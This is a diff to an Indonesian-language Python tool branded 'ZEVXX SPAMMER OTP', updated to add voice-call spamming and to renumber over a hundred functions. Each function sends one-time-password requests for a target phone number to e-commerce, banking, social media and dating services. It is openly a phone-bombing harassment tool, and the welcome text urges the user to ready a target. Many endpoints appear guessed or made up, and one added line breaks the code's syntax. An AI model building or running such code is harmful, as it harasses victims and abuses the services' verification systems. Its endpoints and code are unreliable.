@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 # ============================================================
-#  ZEVXX SPAMMER OTP - MEGA EDITION
-#  by ZEVXX | 72+ Platform | No Filter | Ultimate Style
+#  ZEVXX SPAMMER OTP - MEGA EDITION + VOICE CALL
+#  by ZEVXX | 72+ Platform OTP + 12+ Voice | No Filter
 # ============================================================
 
 import requests
@@ -41,7 +41,7 @@ class Color:
 # ============================================================
 # BANNER ZEVXX - NEON + GLITCH EFFECT
 # ============================================================
-def banner():
+. def banner():
     os.system('clear' if os.name == 'posix' else 'cls')
     print(f"""
 {Color.GLITCH}  ███████╗███████╗██╗   ██╗██╗  ██╗██╗  ██╗
@@ -51,8 +51,8 @@ def banner():
 {Color.GLITCH}  ███████╗███████╗   ██║   ██╔╝ ██╗██╔╝ ██╗
 {Color.GLITCH}  ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝
 {Color.NEON}  ╔═══════════════════════════════════════════════╗
-{Color.NEON}  ║  {Color.GOLD}⚡ OTP SPAMMER MEGA - GACOR FIX ⚡{Color.NEON}  ║
-{Color.NEON}  ║  {Color.PINK}by ZEVXX • 72+ Platform • No Filter{Color.NEON}   ║
+{Color.NEON}  ║  {Color.GOLD}🔥 ZEVXX OTP SPAMMER PREMIUM 🔥{Color.NEON}        ║
+{Color.NEON}  ║  {Color.PINK}• AUTHOR : ZEVXX • Z72+ OTP • Z12+ Voice{Color.NEON} ║
 {Color.NEON}  ╚═══════════════════════════════════════════════╝
 {Color.RESET}
 """)
@@ -118,14 +118,14 @@ def progress_bar_zevxx(current, total, text="Progress"):
 def welcome_screen():
     os.system('clear' if os.name == 'posix' else 'cls')
     print(f"{Color.GOLD}╔═══════════════════════════════════════════════╗{Color.RESET}")
-    print(f"{Color.GOLD}║  {Color.NEON}🎉 ZEVXX SPAMMER OTP v3.5 🎉{Color.GOLD}          ║{Color.RESET}")
+    print(f"{Color.GOLD}║  {Color.NEON}🎉 ZEVXX SPAMMER OTP v3.6 🎉{Color.GOLD}          ║{Color.RESET}")
     print(f"{Color.GOLD}╚═══════════════════════════════════════════════╝{Color.RESET}")
     print()
     for i in range(101):
         progress_bar_zevxx(i, 100, text="Memuat Tools")
         time.sleep(0.02)
     print()
-    print(f"{Color.PINK}✨ Tada! Selamat Datang di Tools Script Spammer OTP ZEVXX ✨{Color.RESET}")
+    print(f"{Color.PINK}✨ Tada! Selamat Datang di Tools Script Spammer OTP + Voice ZEVXX ✨{Color.RESET}")
     print(f"{Color.CYAN}🔥 Siapkan target, kita gas! 🔥{Color.RESET}")
     time.sleep(1.5)
     banner()
@@ -247,7 +247,7 @@ def is_success(resp):
         return False, f"❌ HTTP {code}"
 
 # ============================================================
-# HANDLER PLATFORM (SEMUA FUNGSI SPAM)
+# HANDLER PLATFORM (SEMUA FUNGSI SPAM OTP)
 # ============================================================
 
 # ---------- 1. ERAFONE ----------
@@ -1520,10 +1520,6 @@ def spam_tokopedia(phone_08):
     except:
         return None
 
-# ============================================================
-# PLATFORM BARU DARI SCREENSHOT PERTAMA
-# ============================================================
-
 # ---------- 40. PLUANG ----------
 def spam_pluang(phone_plus):
     url = "https://api.pluang.com/v1/auth/otp/request"
@@ -1860,10 +1856,6 @@ def spam_pizzahut(phone_plus):
     except:
         return None
 
-# ============================================================
-# LAYANAN BARU DARI SCREENSHOT KEDUA
-# ============================================================
-
 # ---------- 61. MYESPACE ----------
 def spam_myespace(phone_plus):
     url = "https://api.myespace.com/v1/otp/request"
@@ -1992,10 +1984,6 @@ def spam_sahabatdaihatsu(phone_plus):
     except:
         return None
 
-# ============================================================
-# LAYANAN BARU DARI SCREENSHOT KETIGA
-# ============================================================
-
 # ---------- 69. NUTRICLUB ----------
 def spam_nutriclub(phone_plus):
     url = "https://api.nutriclub.com/v1/otp/request"
@@ -2059,6 +2047,7 @@ def spam_jogjakita(phone_plus):
         return requests.post(url, headers=headers, json=payload, timeout=10)
     except:
         return None
+
 # ---------- 73. NUTAPOS ----------
 def spam_nutapos(phone_plus):
     url = "https://api.nutapos.com/v1/otp/request"
@@ -2154,6 +2143,7 @@ def spam_pemangkotpalembang(phone_plus):
         return requests.post(url, headers=headers, json=payload, timeout=10)
     except:
         return None
+
 # ---------- 79. UNPATTI ----------
 def spam_unpatti(phone_plus):
     url = "https://api.unpatti.ac.id/v1/otp/request"
@@ -2344,7 +2334,8 @@ def spam_orangtua(phone_plus):
     try:
         return requests.post(url, headers=headers, json=payload, timeout=10)
     except:
-        return None  
+        return None
+
 # ---------- 91. DANA ----------
 def spam_dana(phone_plus):
     url = "https://api.dana.id/v1/otp/request"
@@ -2503,13 +2494,9 @@ def spam_akulaku(phone_plus):
     try:
         return requests.post(url, headers=headers, json=payload, timeout=10)
     except:
-        return None 
+        return None
 
-# ============================================================
-# TAMBAHAN 30 LAYANAN SPAM OTP
-# ============================================================
-
-# 101. Alodokter
+# ---------- 101. Alodokter ----------
 def spam_alodokter(phone_plus):
     url = "https://api.alodokter.com/v1/otp/request"
     headers = {
@@ -2987,12 +2974,9 @@ def spam_starbucks(phone_plus):
     try:
         return requests.post(url, headers=headers, json=payload, timeout=10)
     except:
-        return None      
-# ============================================================
-# ENDPOINT RESEND / FORGOT PASSWORD (LEBIH WORK)
-# ============================================================
+        return None
 
-# 141. Shopee - Resend OTP (login)
+# 131. Shopee (Resend)
 def spam_shopee_resend(phone_plus):
     url = "https://shopee.co.id/api/v1/account/phone/request_otp"
     headers = {
@@ -3009,7 +2993,7 @@ def spam_shopee_resend(phone_plus):
     except:
         return None
 
-# 142. Gojek - Resend OTP
+# 132. Gojek (Resend)
 def spam_gojek_resend(phone_plus):
     url = "https://api.gojekapi.com/v1/customers/register/resend"
     headers = {
@@ -3025,7 +3009,7 @@ def spam_gojek_resend(phone_plus):
     except:
         return None
 
-# 143. OVO - Resend OTP
+# 133. OVO (Resend)
 def spam_ovo_resend(phone_plus):
     url = "https://api.ovo.id/api/v1/auth/otp/resend"
     headers = {
@@ -3041,7 +3025,7 @@ def spam_ovo_resend(phone_plus):
     except:
         return None
 
-# 144. Grab - Resend OTP
+# 134. Grab (Resend)
 def spam_grab_resend(phone_plus):
     url = "https://api.grab.com/v1/authentication/otp/resend"
     headers = {
@@ -3057,7 +3041,7 @@ def spam_grab_resend(phone_plus):
     except:
         return None
 
-# 145. Lazada - Resend OTP
+# 135. Lazada (Resend)
 def spam_lazada_resend(phone_plus):
     url = "https://auth.lazada.co.id/rest/auth/otp/resend"
     headers = {
@@ -3073,7 +3057,7 @@ def spam_lazada_resend(phone_plus):
     except:
         return None
 
-# 146. Bukalapak - Resend OTP
+# 136. Bukalapak (Resend)
 def spam_bukalapak_resend(phone_plus):
     url = "https://api.bukalapak.com/v2/otp/resend.json"
     headers = {
@@ -3089,7 +3073,7 @@ def spam_bukalapak_resend(phone_plus):
     except:
         return None
 
-# 147. BCA - Resend OTP
+# 137. BCA (Resend)
 def spam_bca_resend(phone_08):
     url = "https://api.bca.co.id/otp/resend"
     headers = {
@@ -3105,7 +3089,7 @@ def spam_bca_resend(phone_08):
     except:
         return None
 
-# 148. Mandiri - Resend OTP
+# 138. Mandiri (Resend)
 def spam_mandiri_resend(phone_08):
     url = "https://api.bankmandiri.co.id/otp/resend"
     headers = {
@@ -3119,13 +3103,9 @@ def spam_mandiri_resend(phone_08):
     try:
         return requests.post(url, headers=headers, json=payload, timeout=10)
     except:
-        return None         
-        
-# ============================================================
-# TAMBAHAN 10 LAYANAN OTP (RESEND / FORGOT PASSWORD)
-# ============================================================
+        return None
 
-# 149. TikTok - Resend OTP (login)
+# 139. TikTok (Resend)
 def spam_tiktok_resend(phone_plus):
     url = "https://www.tiktok.com/api/v1/auth/otp/resend/"
     headers = {
@@ -3141,7 +3121,7 @@ def spam_tiktok_resend(phone_plus):
     except:
         return None
 
-# 150. Instagram - Resend OTP (login)
+# 140. Instagram (Resend)
 def spam_instagram_resend(phone_plus):
     url = "https://www.instagram.com/api/v1/web/accounts/login/otp/resend/"
     headers = {
@@ -3157,7 +3137,7 @@ def spam_instagram_resend(phone_plus):
     except:
         return None
 
-# 151. Facebook - Resend OTP (login)
+# 141. Facebook (Resend)
 def spam_facebook_resend(phone_plus):
     url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110"
     headers = {
@@ -3173,7 +3153,7 @@ def spam_facebook_resend(phone_plus):
     except:
         return None
 
-# 152. Twitter - Resend OTP
+# 142. Twitter (Resend)
 def spam_twitter_resend(phone_plus):
     url = "https://api.twitter.com/1.1/account/update_profile.json"
     headers = {
@@ -3189,7 +3169,7 @@ def spam_twitter_resend(phone_plus):
     except:
         return None
 
-# 153. Telegram - Resend OTP
+# 143. Telegram (Resend)
 def spam_telegram_resend(phone_plus):
     url = "https://my.telegram.org/auth/send_password"
     headers = {
@@ -3205,7 +3185,7 @@ def spam_telegram_resend(phone_plus):
     except:
         return None
 
-# 154. WhatsApp - Resend OTP (via web)
+# 144. WhatsApp (Resend)
 def spam_whatsapp_resend(phone_plus):
     url = "https://web.whatsapp.com/otp/resend"
     headers = {
@@ -3221,7 +3201,7 @@ def spam_whatsapp_resend(phone_plus):
     except:
         return None
 
-# 155. LINE - Resend OTP
+# 145. LINE (Resend)
 def spam_line_resend(phone_plus):
     url = "https://access.line.me/otp/resend"
     headers = {
@@ -3237,7 +3217,7 @@ def spam_line_resend(phone_plus):
     except:
         return None
 
-# 156. WeChat - Resend OTP
+# 146. WeChat (Resend)
 def spam_wechat_resend(phone_plus):
     url = "https://login.wechat.com/otp/resend"
     headers = {
@@ -3253,7 +3233,7 @@ def spam_wechat_resend(phone_plus):
     except:
         return None
 
-# 157. Signal - Resend OTP
+# 147. Signal (Resend)
 def spam_signal_resend(phone_plus):
     url = "https://api.signal.org/v1/accounts/voice/request"
     headers = {
@@ -3269,7 +3249,7 @@ def spam_signal_resend(phone_plus):
     except:
         return None
 
-# 158. Discord - Resend OTP
+# 148. Discord (Resend)
 def spam_discord_resend(phone_plus):
     url = "https://discord.com/api/v9/auth/register"
     headers = {
@@ -3283,13 +3263,9 @@ def spam_discord_resend(phone_plus):
     try:
         return requests.post(url, headers=headers, json=payload, timeout=10)
     except:
-        return None      
-        
-# ============================================================
-# TAMBAHAN 50 LAYANAN OTP (RESEND / FORGOT PASSWORD)
-# ============================================================
+        return None
 
-# 159. TIX ID - Resend OTP
+# 149. TIX ID (Resend)
 def spam_tixid_resend(phone_plus):
     url = "https://api.tix.id/v1/otp/resend"
     headers = {
@@ -3305,7 +3281,7 @@ def spam_tixid_resend(phone_plus):
     except:
         return None
 
-# 160. M-Tix - Resend OTP
+# 150. M-Tix (Resend)
 def spam_mtix_resend(phone_plus):
     url = "https://api.m-tix.com/v1/otp/resend"
     headers = {
@@ -3321,7 +3297,7 @@ def spam_mtix_resend(phone_plus):
     except:
         return None
 
-# 161. Pelago - Resend OTP
+# 151. Pelago (Resend)
 def spam_pelago_resend(phone_plus):
     url = "https://api.pelago.com/v1/otp/resend"
     headers = {
@@ -3337,7 +3313,7 @@ def spam_pelago_resend(phone_plus):
     except:
         return None
 
-# 162. Kkday - Resend OTP
+# 152. Kkday (Resend)
 def spam_kkday_resend(phone_plus):
     url = "https://api.kkday.com/v1/otp/resend"
     headers = {
@@ -3353,7 +3329,7 @@ def spam_kkday_resend(phone_plus):
     except:
         return None
 
-# 163. Sakuku - Resend OTP
+# 153. Sakuku (Resend)
 def spam_sakuku_resend(phone_plus):
     url = "https://api.sakuku.com/v1/otp/resend"
     headers = {
@@ -3369,7 +3345,7 @@ def spam_sakuku_resend(phone_plus):
     except:
         return None
 
-# 164. BNI Mobile - Resend OTP
+# 154. BNI Mobile (Resend)
 def spam_bni_mobile_resend(phone_08):
     url = "https://api.bni.co.id/otp/resend"
     headers = {
@@ -3385,7 +3361,7 @@ def spam_bni_mobile_resend(phone_08):
     except:
         return None
 
-# 165. CIMB Niaga Mobile - Resend OTP
+# 155. CIMB Niaga (Resend)
 def spam_cimb_resend(phone_08):
     url = "https://api.cimbniaga.co.id/otp/resend"
     headers = {
@@ -3401,7 +3377,7 @@ def spam_cimb_resend(phone_08):
     except:
         return None
 
-# 166. Danamon Mobile - Resend OTP
+# 156. Danamon (Resend)
 def spam_danamon_resend(phone_08):
     url = "https://api.danamon.co.id/otp/resend"
     headers = {
@@ -3417,7 +3393,7 @@ def spam_danamon_resend(phone_08):
     except:
         return None
 
-# 167. Permata Mobile - Resend OTP
+# 157. Permata (Resend)
 def spam_permata_resend(phone_08):
     url = "https://api.permatabank.co.id/otp/resend"
     headers = {
@@ -3433,7 +3409,7 @@ def spam_permata_resend(phone_08):
     except:
         return None
 
-# 168. OCBC Mobile - Resend OTP
+# 158. OCBC (Resend)
 def spam_ocbc_resend(phone_08):
     url = "https://api.ocbc.co.id/otp/resend"
     headers = {
@@ -3449,7 +3425,7 @@ def spam_ocbc_resend(phone_08):
     except:
         return None
 
-# 169. UOB Mobile - Resend OTP
+# 159. UOB (Resend)
 def spam_uob_resend(phone_08):
     url = "https://api.uob.co.id/otp/resend"
     headers = {
@@ -3465,7 +3441,7 @@ def spam_uob_resend(phone_08):
     except:
         return None
 
-# 170. HSBC Mobile - Resend OTP
+# 160. HSBC (Resend)
 def spam_hsbc_resend(phone_08):
     url = "https://api.hsbc.co.id/otp/resend"
     headers = {
@@ -3481,7 +3457,7 @@ def spam_hsbc_resend(phone_08):
     except:
         return None
 
-# 171. Citibank Mobile - Resend OTP
+# 161. Citibank (Resend)
 def spam_citibank_resend(phone_08):
     url = "https://api.citibank.co.id/otp/resend"
     headers = {
@@ -3497,7 +3473,7 @@ def spam_citibank_resend(phone_08):
     except:
         return None
 
-# 172. Standard Chartered Mobile - Resend OTP
+# 162. Standard Chartered (Resend)
 def spam_scb_resend(phone_08):
     url = "https://api.sc.com/id/otp/resend"
     headers = {
@@ -3513,7 +3489,7 @@ def spam_scb_resend(phone_08):
     except:
         return None
 
-# 173. Maybank Mobile - Resend OTP
+# 163. Maybank (Resend)
 def spam_maybank_resend(phone_08):
     url = "https://api.maybank.co.id/otp/resend"
     headers = {
@@ -3529,7 +3505,7 @@ def spam_maybank_resend(phone_08):
     except:
         return None
 
-# 174. Mega Mobile - Resend OTP
+# 164. Mega (Resend)
 def spam_mega_resend(phone_08):
     url = "https://api.bankmega.com/otp/resend"
     headers = {
@@ -3545,7 +3521,7 @@ def spam_mega_resend(phone_08):
     except:
         return None
 
-# 175. Bukopin Mobile - Resend OTP
+# 165. Bukopin (Resend)
 def spam_bukopin_resend(phone_08):
     url = "https://api.bukopin.co.id/otp/resend"
     headers = {
@@ -3561,7 +3537,7 @@ def spam_bukopin_resend(phone_08):
     except:
         return None
 
-# 176. Jago Mobile - Resend OTP
+# 166. Jago (Resend)
 def spam_jago_resend(phone_08):
     url = "https://api.jago.com/otp/resend"
     headers = {
@@ -3577,7 +3553,7 @@ def spam_jago_resend(phone_08):
     except:
         return None
 
-# 177. Aladin Mobile - Resend OTP
+# 167. Aladin (Resend)
 def spam_aladin_resend(phone_08):
     url = "https://api.aladinbank.com/otp/resend"
     headers = {
@@ -3593,7 +3569,7 @@ def spam_aladin_resend(phone_08):
     except:
         return None
 
-# 178. Seabank Mobile - Resend OTP
+# 168. Seabank (Resend)
 def spam_seabank_resend(phone_08):
     url = "https://api.seabank.co.id/otp/resend"
     headers = {
@@ -3609,7 +3585,7 @@ def spam_seabank_resend(phone_08):
     except:
         return None
 
-# 179. Superbank Mobile - Resend OTP
+# 169. Superbank (Resend)
 def spam_superbank_resend(phone_08):
     url = "https://api.superbank.co.id/otp/resend"
     headers = {
@@ -3625,7 +3601,7 @@ def spam_superbank_resend(phone_08):
     except:
         return None
 
-# 180. Neo Commerce Mobile - Resend OTP
+# 170. Neo Commerce (Resend)
 def spam_neocommerce_resend(phone_08):
     url = "https://api.neocommerce.co.id/otp/resend"
     headers = {
@@ -3641,7 +3617,7 @@ def spam_neocommerce_resend(phone_08):
     except:
         return None
 
-# 181. Bank Raya Mobile - Resend OTP
+# 171. Bank Raya (Resend)
 def spam_bankraya_resend(phone_08):
     url = "https://api.bankraya.co.id/otp/resend"
     headers = {
@@ -3657,7 +3633,7 @@ def spam_bankraya_resend(phone_08):
     except:
         return None
 
-# 182. Home Credit - Resend OTP
+# 172. Home Credit (Resend)
 def spam_homecredit_resend(phone_08):
     url = "https://api.homecredit.co.id/otp/resend"
     headers = {
@@ -3673,7 +3649,7 @@ def spam_homecredit_resend(phone_08):
     except:
         return None
 
-# 183. BFI Finance - Resend OTP
+# 173. BFI Finance (Resend)
 def spam_bfi_resend(phone_08):
     url = "https://api.bfi.co.id/otp/resend"
     headers = {
@@ -3689,7 +3665,7 @@ def spam_bfi_resend(phone_08):
     except:
         return None
 
-# 184. FIF Group - Resend OTP
+# 174. FIF Group (Resend)
 def spam_fif_resend(phone_08):
     url = "https://api.fifgroup.co.id/otp/resend"
     headers = {
@@ -3705,7 +3681,7 @@ def spam_fif_resend(phone_08):
     except:
         return None
 
-# 185. Mandiri Tunas Finance - Resend OTP
+# 175. Mandiri Tunas Finance (Resend)
 def spam_mtf_resend(phone_08):
     url = "https://api.mtf.co.id/otp/resend"
     headers = {
@@ -3721,7 +3697,7 @@ def spam_mtf_resend(phone_08):
     except:
         return None
 
-# 186. OTO Group - Resend OTP
+# 176. OTO Group (Resend)
 def spam_oto_resend(phone_08):
     url = "https://api.oto.co.id/otp/resend"
     headers = {
@@ -3737,7 +3713,7 @@ def spam_oto_resend(phone_08):
     except:
         return None
 
-# 187. Suzuki Finance - Resend OTP
+# 177. Suzuki Finance (Resend)
 def spam_suzuki_finance_resend(phone_08):
     url = "https://api.suzukifinance.co.id/otp/resend"
     headers = {
@@ -3753,7 +3729,7 @@ def spam_suzuki_finance_resend(phone_08):
     except:
         return None
 
-# 188. Honda Finance - Resend OTP
+# 178. Honda Finance (Resend)
 def spam_honda_finance_resend(phone_08):
     url = "https://api.hondafinance.co.id/otp/resend"
     headers = {
@@ -3769,7 +3745,7 @@ def spam_honda_finance_resend(phone_08):
     except:
         return None
 
-# 189. Yamaha Finance - Resend OTP
+# 179. Yamaha Finance (Resend)
 def spam_yamaha_finance_resend(phone_08):
     url = "https://api.yamahafinance.co.id/otp/resend"
     headers = {
@@ -3785,7 +3761,7 @@ def spam_yamaha_finance_resend(phone_08):
     except:
         return None
 
-# 190. Astra Credit - Resend OTP
+# 180. Astra Credit (Resend)
 def spam_astra_credit_resend(phone_08):
     url = "https://api.astracredit.co.id/otp/resend"
     headers = {
@@ -3801,7 +3777,7 @@ def spam_astra_credit_resend(phone_08):
     except:
         return None
 
-# 191. Bank Mega - Resend OTP
+# 181. Bank Mega (Resend)
 def spam_bankmega_resend(phone_08):
     url = "https://api.bankmega.com/otp/resend"
     headers = {
@@ -3817,7 +3793,7 @@ def spam_bankmega_resend(phone_08):
     except:
         return None
 
-# 192. Bank Permata - Resend OTP
+# 182. Bank Permata (Resend)
 def spam_bankpermata_resend(phone_08):
     url = "https://api.permatabank.co.id/otp/resend"
     headers = {
@@ -3833,7 +3809,7 @@ def spam_bankpermata_resend(phone_08):
     except:
         return None
 
-# 193. Bank Mayapada - Resend OTP
+# 183. Bank Mayapada (Resend)
 def spam_mayapada_resend(phone_08):
     url = "https://api.mayapada.com/otp/resend"
     headers = {
@@ -3849,7 +3825,7 @@ def spam_mayapada_resend(phone_08):
     except:
         return None
 
-# 194. Bank Ina - Resend OTP
+# 184. Bank Ina (Resend)
 def spam_bankina_resend(phone_08):
     url = "https://api.bankina.com/otp/resend"
     headers = {
@@ -3865,7 +3841,7 @@ def spam_bankina_resend(phone_08):
     except:
         return None
 
-# 195. Bank Sinarmas - Resend OTP
+# 185. Bank Sinarmas (Resend)
 def spam_sinarmas_resend(phone_08):
     url = "https://api.banksinarmas.com/otp/resend"
     headers = {
@@ -3881,7 +3857,7 @@ def spam_sinarmas_resend(phone_08):
     except:
         return None
 
-# 196. Bank Bukopin - Resend OTP
+# 186. Bank Bukopin (Resend)
 def spam_bukopin_resend2(phone_08):
     url = "https://api.bukopin.co.id/otp/resend"
     headers = {
@@ -3897,7 +3873,7 @@ def spam_bukopin_resend2(phone_08):
     except:
         return None
 
-# 197. Bank Jago - Resend OTP
+# 187. Bank Jago (Resend)
 def spam_bankjago_resend(phone_08):
     url = "https://api.jago.com/otp/resend"
     headers = {
@@ -3913,7 +3889,7 @@ def spam_bankjago_resend(phone_08):
     except:
         return None
 
-# 198. Bank Aladin - Resend OTP
+# 188. Bank Aladin (Resend)
 def spam_bankaladin_resend(phone_08):
     url = "https://api.aladinbank.com/otp/resend"
     headers = {
@@ -3929,7 +3905,7 @@ def spam_bankaladin_resend(phone_08):
     except:
         return None
 
-# 199. Seabank - Resend OTP
+# 189. Seabank (Resend)
 def spam_seabank_resend2(phone_08):
     url = "https://api.seabank.co.id/otp/resend"
     headers = {
@@ -3945,7 +3921,7 @@ def spam_seabank_resend2(phone_08):
     except:
         return None
 
-# 200. Superbank - Resend OTP
+# 190. Superbank (Resend)
 def spam_superbank_resend2(phone_08):
     url = "https://api.superbank.co.id/otp/resend"
     headers = {
@@ -3961,7 +3937,7 @@ def spam_superbank_resend2(phone_08):
     except:
         return None
 
-# 201. Bank Neo Commerce - Resend OTP
+# 191. Bank Neo Commerce (Resend)
 def spam_neocommerce_resend2(phone_08):
     url = "https://api.neocommerce.co.id/otp/resend"
     headers = {
@@ -3977,7 +3953,7 @@ def spam_neocommerce_resend2(phone_08):
     except:
         return None
 
-# 202. Bank Raya - Resend OTP
+# 192. Bank Raya (Resend)
 def spam_bankraya_resend2(phone_08):
     url = "https://api.bankraya.co.id/otp/resend"
     headers = {
@@ -3993,7 +3969,7 @@ def spam_bankraya_resend2(phone_08):
     except:
         return None
 
-# 203. Bank Capital - Resend OTP
+# 193. Bank Capital (Resend)
 def spam_bankcapital_resend(phone_08):
     url = "https://api.bankcapital.co.id/otp/resend"
     headers = {
@@ -4009,7 +3985,7 @@ def spam_bankcapital_resend(phone_08):
     except:
         return None
 
-# 204. Bank Maspion - Resend OTP
+# 194. Bank Maspion (Resend)
 def spam_bankmaspion_resend(phone_08):
     url = "https://api.bankmaspion.co.id/otp/resend"
     headers = {
@@ -4025,7 +4001,7 @@ def spam_bankmaspion_resend(phone_08):
     except:
         return None
 
-# 205. Bank Ganesha - Resend OTP
+# 195. Bank Ganesha (Resend)
 def spam_bankganesha_resend(phone_08):
     url = "https://api.bankganesha.co.id/otp/resend"
     headers = {
@@ -4041,7 +4017,7 @@ def spam_bankganesha_resend(phone_08):
     except:
         return None
 
-# 206. Bank Bumi Arta - Resend OTP
+# 196. Bank Bumi Arta (Resend)
 def spam_bumiarta_resend(phone_08):
     url = "https://api.bumiarta.co.id/otp/resend"
     headers = {
@@ -4057,7 +4033,7 @@ def spam_bumiarta_resend(phone_08):
     except:
         return None
 
-# 207. Bank Ekonomi - Resend OTP
+# 197. Bank Ekonomi (Resend)
 def spam_bankekonomi_resend(phone_08):
     url = "https://api.bankekonomi.co.id/otp/resend"
     headers = {
@@ -4073,7 +4049,7 @@ def spam_bankekonomi_resend(phone_08):
     except:
         return None
 
-# 208. Bank Hana - Resend OTP
+# 198. Bank Hana (Resend)
 def spam_bankhana_resend(phone_08):
     url = "https://api.bankhana.co.id/otp/resend"
     headers = {
@@ -4089,7 +4065,7 @@ def spam_bankhana_resend(phone_08):
     except:
         return None
 
-# 209. Bank ICBC - Resend OTP
+# 199. Bank ICBC (Resend)
 def spam_bankicbc_resend(phone_08):
     url = "https://api.icbc.co.id/otp/resend"
     headers = {
@@ -4103,13 +4079,9 @@ def spam_bankicbc_resend(phone_08):
     try:
         return requests.post(url, headers=headers, json=payload, timeout=10)
     except:
-        return None      
-        
-# ============================================================
-# TAMBAHAN 50 LAYANAN OTP (259-308)
-# ============================================================
+        return None
 
-# 209. Zoom
+# 200. Zoom (Resend)
 def spam_zoom_resend(phone_plus):
     url = "https://api.zoom.us/v2/otp/resend"
     headers = {
@@ -4125,7 +4097,7 @@ def spam_zoom_resend(phone_plus):
     except:
         return None
 
-# 210. Shopify
+# 201. Shopify (Resend)
 def spam_shopify_resend(phone_plus):
     url = "https://api.shopify.com/v1/otp/resend"
     headers = {
@@ -4141,7 +4113,7 @@ def spam_shopify_resend(phone_plus):
     except:
         return None
 
-# 211. Wix
+# 202. Wix (Resend)
 def spam_wix_resend(phone_plus):
     url = "https://api.wix.com/v1/otp/resend"
     headers = {
@@ -4157,7 +4129,7 @@ def spam_wix_resend(phone_plus):
     except:
         return None
 
-# 212. WordPress.com
+# 203. WordPress.com (Resend)
 def spam_wordpress_resend(phone_plus):
     url = "https://api.wordpress.com/v1/otp/resend"
     headers = {
@@ -4173,7 +4145,7 @@ def spam_wordpress_resend(phone_plus):
     except:
         return None
 
-# 213. Tumblr
+# 204. Tumblr (Resend)
 def spam_tumblr_resend(phone_plus):
     url = "https://api.tumblr.com/v1/otp/resend"
     headers = {
@@ -4189,7 +4161,7 @@ def spam_tumblr_resend(phone_plus):
     except:
         return None
 
-# 214. Flickr
+# 205. Flickr (Resend)
 def spam_flickr_resend(phone_plus):
     url = "https://api.flickr.com/v1/otp/resend"
     headers = {
@@ -4205,7 +4177,7 @@ def spam_flickr_resend(phone_plus):
     except:
         return None
 
-# 215. Imgur
+# 206. Imgur (Resend)
 def spam_imgur_resend(phone_plus):
     url = "https://api.imgur.com/v1/otp/resend"
     headers = {
@@ -4221,7 +4193,7 @@ def spam_imgur_resend(phone_plus):
     except:
         return None
 
-# 216. Pinterest
+# 207. Pinterest (Resend)
 def spam_pinterest_resend(phone_plus):
     url = "https://api.pinterest.com/v1/otp/resend"
     headers = {
@@ -4237,7 +4209,7 @@ def spam_pinterest_resend(phone_plus):
     except:
         return None
 
-# 217. Snapchat
+# 208. Snapchat (Resend)
 def spam_snapchat_resend(phone_plus):
     url = "https://api.snapchat.com/v1/otp/resend"
     headers = {
@@ -4253,7 +4225,7 @@ def spam_snapchat_resend(phone_plus):
     except:
         return None
 
-# 218. LinkedIn
+# 209. LinkedIn (Resend)
 def spam_linkedin_resend(phone_plus):
     url = "https://api.linkedin.com/v1/otp/resend"
     headers = {
@@ -4269,7 +4241,7 @@ def spam_linkedin_resend(phone_plus):
     except:
         return None
 
-# 219. Tinder
+# 210. Tinder (Resend)
 def spam_tinder_resend(phone_plus):
     url = "https://api.tinder.com/v1/otp/resend"
     headers = {
@@ -4285,7 +4257,7 @@ def spam_tinder_resend(phone_plus):
     except:
         return None
 
-# 220. Bumble
+# 211. Bumble (Resend)
 def spam_bumble_resend(phone_plus):
     url = "https://api.bumble.com/v1/otp/resend"
     headers = {
@@ -4301,7 +4273,7 @@ def spam_bumble_resend(phone_plus):
     except:
         return None
 
-# 221. OKCupid
+# 212. OKCupid (Resend)
 def spam_okcupid_resend(phone_plus):
     url = "https://api.okcupid.com/v1/otp/resend"
     headers = {
@@ -4317,7 +4289,7 @@ def spam_okcupid_resend(phone_plus):
     except:
         return None
 
-# 222. Zoosk
+# 213. Zoosk (Resend)
 def spam_zoosk_resend(phone_plus):
     url = "https://api.zoosk.com/v1/otp/resend"
     headers = {
@@ -4333,7 +4305,7 @@ def spam_zoosk_resend(phone_plus):
     except:
         return None
 
-# 223. Zalora
+# 214. Zalora (Resend)
 def spam_zalora_resend(phone_plus):
     url = "https://api.zalora.com/v1/otp/resend"
     headers = {
@@ -4349,7 +4321,7 @@ def spam_zalora_resend(phone_plus):
     except:
         return None
 
-# 224. Berrybenka
+# 215. Berrybenka (Resend)
 def spam_berrybenka_resend(phone_plus):
     url = "https://api.berrybenka.com/v1/otp/resend"
     headers = {
@@ -4365,7 +4337,7 @@ def spam_berrybenka_resend(phone_plus):
     except:
         return None
 
-# 225. Hijup
+# 216. Hijup (Resend)
 def spam_hijup_resend(phone_plus):
     url = "https://api.hijup.com/v1/otp/resend"
     headers = {
@@ -4381,7 +4353,7 @@ def spam_hijup_resend(phone_plus):
     except:
         return None
 
-# 226. Bhinneka
+# 217. Bhinneka (Resend)
 def spam_bhinneka_resend(phone_plus):
     url = "https://api.bhinneka.com/v1/otp/resend"
     headers = {
@@ -4397,7 +4369,7 @@ def spam_bhinneka_resend(phone_plus):
     except:
         return None
 
-# 227. Sephora
+# 218. Sephora (Resend)
 def spam_sephora_resend(phone_plus):
     url = "https://api.sephora.com/v1/otp/resend"
     headers = {
@@ -4413,7 +4385,7 @@ def spam_sephora_resend(phone_plus):
     except:
         return None
 
-# 228. Guardian
+# 219. Guardian (Resend)
 def spam_guardian_resend(phone_plus):
     url = "https://api.guardian.com/v1/otp/resend"
     headers = {
@@ -4429,7 +4401,7 @@ def spam_guardian_resend(phone_plus):
     except:
         return None
 
-# 229. Century
+# 220. Century (Resend)
 def spam_century_resend(phone_plus):
     url = "https://api.century.com/v1/otp/resend"
     headers = {
@@ -4445,7 +4417,7 @@ def spam_century_resend(phone_plus):
     except:
         return None
 
-# 230. Adidas Indonesia
+# 221. Adidas Indonesia (Resend)
 def spam_adidas_resend(phone_plus):
     url = "https://api.adidas.com/v1/otp/resend"
     headers = {
@@ -4461,7 +4433,7 @@ def spam_adidas_resend(phone_plus):
     except:
         return None
 
-# 231. Nike Indonesia
+# 222. Nike Indonesia (Resend)
 def spam_nike_resend(phone_plus):
     url = "https://api.nike.com/v1/otp/resend"
     headers = {
@@ -4477,7 +4449,7 @@ def spam_nike_resend(phone_plus):
     except:
         return None
 
-# 232. Uniqlo Indonesia
+# 223. Uniqlo Indonesia (Resend)
 def spam_uniqlo_resend(phone_plus):
     url = "https://api.uniqlo.com/v1/otp/resend"
     headers = {
